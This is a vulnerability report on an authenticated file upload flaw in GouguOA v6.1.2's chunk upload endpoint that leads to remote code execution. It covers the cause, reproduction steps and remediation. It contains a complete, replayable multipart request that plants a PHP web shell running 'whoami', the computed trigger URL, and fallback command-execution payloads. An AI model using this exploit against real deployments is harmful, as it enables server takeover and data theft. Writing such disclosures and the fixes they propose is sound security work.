# GouguOA Chunk Upload — Unrestricted File Upload Leading to Remote Code Execution (Vulnerability Report)

> Report ID: GG-RCE-001 | Date: 2026-09-28 | Status: Dynamically verified

## 1. Vulnerability Type

Unrestricted Upload of File with Dangerous Type leading to Remote Code Execution (RCE)

- CWE-434 (Unrestricted Upload of File with Dangerous Type)
- CVSS 3.1: **8.8 High** (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)
- Authentication required: **any authenticated employee** (a regular employee with the default seeded role is sufficient; no special privileges needed)

## 2. Affected Product and Download

- **GouguOA v6.1.2** (reproduced on a default installation with default configuration)
- Official repository: https://gitee.com/gouguopen/office
- Affected release download: https://gitee.com/gouguopen/office/repository/archive/v6.1.2.zip (or the v6.1.2 entry on the repository's Releases page)
- Vendor homepage: https://www.gouguoa.com
- Earlier versions were not tested; versions containing the same `chunkUpload` implementation are presumed affected.

## 3. Environment Setup (Reference Deployment)

Requirements (per vendor documentation):

- PHP >= 8.2, with extensions `pdo_mysql`, `mbstring`, `curl`, `fileinfo`, `gd`, `openssl`, `zip`; `putenv` and `proc_open` must not be listed in `disable_functions`
- MySQL >= 5.7 (InnoDB)
- Apache or Nginx

Steps:

1. Download and extract the v6.1.2 source archive (see §2), then run `composer install` in the project root (a China mirror such as `https://mirrors.aliyun.com/composer/` may be configured if packagist is slow).
2. Point the web server document root at the project's `public/` directory and enable the ThinkPHP rewrite rule. A known-good Apache rule (query-string style, works under mod_fcgid where PATH_INFO style fails with "No input file specified"):
   ```
   RewriteEngine On
   RewriteCond %{REQUEST_FILENAME} !-d
   RewriteCond %{REQUEST_FILENAME} !-f
   RewriteRule ^(.*)$ index.php?s=/$1 [QSA,PT,L]
   ```
3. Open the installation wizard at `/install/index` and complete it with the MySQL connection details. The wizard creates the database schema, the administrator account, and the default seeded roles and approval flows.
4. Log in as administrator and create one regular employee account (人事管理 → 企业员工 / HR → Employees) without granting any additional permissions. The default seeded role assigned to regular employees is sufficient for the PoC in §6.

Verification environment used for this report: GouguOA v6.1.2 (default installation), Apache 2.4.39 + mod_fcgid, PHP 8.2.9, MySQL 5.7, Windows.

## 4. Vulnerability Description

The chunked file upload endpoint of GouguOA, `POST /disk/api/chunkUpload` (source: `app/disk/controller/Api.php:212-337`), combines two flaws that allow any authenticated employee to write and execute arbitrary PHP code inside the web root:

1. **The extension whitelist applies only to chunk parts, not to the merged output.** The endpoint validates each uploaded chunk (e.g. `c.txt`) against a whitelist (images/documents/archives/media), but the final merged filename is assembled as
   `md5(file_id . file_name) . '.' . file_extension` (line 274), where **`file_extension` is taken verbatim from a user-supplied POST parameter with no whitelist** — allowing `php`.
2. **The merged file is written into a web-accessible directory.** The storage disk is configured (`config/filesystem.php`) with `root = <project>/public/storage` and `url = /storage`; merged files land under `public/storage/{Ym}/`, which Apache processes as PHP.

Exploitation characteristics: the endpoint ultimately returns **HTTP 500** — this is a fatal error caused by a call to the undefined function `get_login_admin()` (line 313) that occurs **after** the payload file has been written to disk, so it does not prevent exploitation. The output filename is the md5 of two attacker-chosen inputs (`file_id`, `file_name`) and can be computed offline; no server response is needed to know the path.

A byte-identical copy of this code exists at `app/api/controller/Index.php:149` (`/api/index/chunkUpload`). That copy is currently **not exploitable** because its entry line dereferences an undefined `$this->request` property and aborts before writing anything; if the vendor fixes only that entry defect, the second endpoint becomes reachable as well.

## 5. Reproduction Steps

1. Log in with **any regular employee account** (see §3 step 4) and obtain the session cookie `PHPSESSID`.
2. Send the multipart request shown in §6 (a single request performs both "store chunk" and "merge", via `is_end=1`).
3. Expect an `HTTP 500` response (the application's custom error page — this is normal, see §4).
4. Compute the output filename: `md5(file_id + file_name)`. In this example, `md5("ggrce001" + "poc") = 8e312c0821f3af28c9077fa251f91a64`; the directory is the current year and month (e.g. `202609`).
5. Request `GET /storage/202609/8e312c0821f3af28c9077fa251f91a64.php`. The page returns the output of the `whoami` command, confirming operating-system command execution on the server.

Verified results: the steps above were executed with both an administrator session and a regular-employee session (default seeded role); both achieved command execution. With the regular-employee session, `<?php system("whoami"); ?>` returned **`PCUSER-\admin`** (computer-name\current-user on a Windows deployment).

## 6. Payload

```http
POST /index.php?s=/disk/api/chunkUpload HTTP/1.1
Host: <target>
Cookie: PHPSESSID=<any-employee-session>
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="type"

chunk
------x
Content-Disposition: form-data; name="file_id"

ggrce001
------x
Content-Disposition: form-data; name="is_end"

1
------x
Content-Disposition: form-data; name="file_name"

poc
------x
Content-Disposition: form-data; name="file_extension"

php
------x
Content-Disposition: form-data; name="file_size"

27
------x
Content-Disposition: form-data; name="file"; filename="c.txt"
Content-Type: text/plain

<?php system("whoami"); ?>
------x--
```

Trigger (GET):

```http
GET /storage/202609/8e312c0821f3af28c9077fa251f91a64.php HTTP/1.1
Host: <target>
```

Response body (verified, regular-employee session):

```
PCUSER-\admin
```

> Fallback payloads (try in order if `system` is disabled via `disable_functions` on the target):
> ```php
> <?php echo shell_exec("whoami"); ?>      // shell_exec
> <?php passthru("whoami"); ?>             // passthru
> <?php echo exec("whoami"); ?>            // exec (last line only)
> ```

> Notes: `<target>` and `<any-employee-session>` are placeholders. When changing `file_id`/`file_name`, recompute the filename as `md5(file_id+file_name)`. Repeated uploads with the same `file_id` append to the existing file (`fopen a+b`).

## 7. Remediation

1. **Enforce an extension whitelist on the merged file.** Apply the same whitelist used for chunk parts to the `file_extension` parameter, rejecting everything else including `php/php5/phtml/pht` (root fix: `Api.php:274`).
2. **Normalize parameters.** Restrict `file_id`/`file_name` to `[A-Za-z0-9_-]` to eliminate the chunk-directory traversal surface (`file_id` is concatenated directly into `storage/chunk/{file_id}/`).
3. **Fix the fatal errors.** Replace the undefined `get_login_admin('id')` at `Api.php:313` with `$this->uid`; replace `$this->request->isPost()` at `app/api/controller/Index.php:150` with the `request()->isPost()` helper. Note: the latter fix makes the second endpoint reachable — **it must ship together with fix #1**.
4. **Move storage out of the web root.** Store chunks and merged files on the framework's `local` disk (under `runtime/`) and serve downloads through an authorization- and ownership-checked controller.
5. **Hunt for artifacts.** After patching, scan for `public/storage/**/*.php` and `public/backup/*.sql` files as indicators of prior exploitation.

---

*This report was produced from dynamically verified testing in an authorized lab environment; all requests can be replayed as-is in Burp Repeater.*
